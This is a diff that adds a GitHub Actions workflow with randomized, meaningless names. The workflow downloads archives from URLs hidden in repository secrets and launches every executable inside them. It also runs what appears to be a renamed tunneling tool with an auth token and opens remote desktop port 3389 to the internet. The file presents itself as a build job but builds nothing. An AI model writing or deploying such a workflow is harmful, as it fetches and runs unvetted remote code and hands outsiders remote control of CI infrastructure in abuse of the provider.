@@ -1,0 +1,28 @@
+name: AYYCRE
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: olxxpn
+      env:
+        FNSAI: ${{ secrets.ZHEKPQ }}    
+      run: Invoke-WebRequest "$Env:FNSAI" -OutFile fsqz.zip
+    - name: oxnllm
+      run: Expand-Archive fsqz.zip -DestinationPath .
+    - name: vflstp
+      env:
+        IGDWJ: ${{ secrets.QAGZKW }}
+      run: .\tuon.exe authtoken "$Env:IGDWJ"    
+    - name: eclabj
+      env:
+        TMUDE: ${{ secrets.ULLVBV }}
+      run: |
+        Invoke-WebRequest "$Env:TMUDE" -OutFile sesm.zip
+        Expand-Archive sesm.zip -DestinationPath D:\PSYQ
+        Get-ChildItem "D:\PSYQ" -Filter *.exe | ForEach-Object {Start-Process $_.FullName}
+    - name: tqejon
+      run: .\tuon.exe tcp 3389 --region=us-cal-1
